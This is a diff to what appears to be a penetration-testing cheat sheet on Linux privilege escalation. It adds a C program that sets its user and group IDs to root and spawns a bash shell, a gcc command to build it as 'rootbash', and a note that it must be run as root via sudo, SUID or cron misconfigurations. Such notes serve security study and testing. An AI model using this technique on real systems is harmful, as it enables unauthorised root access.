@@ -28,7 +28,23 @@ $ /tmp/rootbash -p
 ```
 </div><div>
 
-...
+* ➡️ Version 2: with root executing an executable
+
+```c
+int main() {
+  setgid(0);
+  setuid(0);
+  system("/bin/bash");
+  return 0;
+}
+```
+
+```bash
+$ gcc xxx.c -o rootbash
+```
+
+Then, you have to execute `rootbash` as root, either using a misconfiguration in sudo, SUID, cron jobs...
+
 </div></div>
 
 <hr class="sep-both">
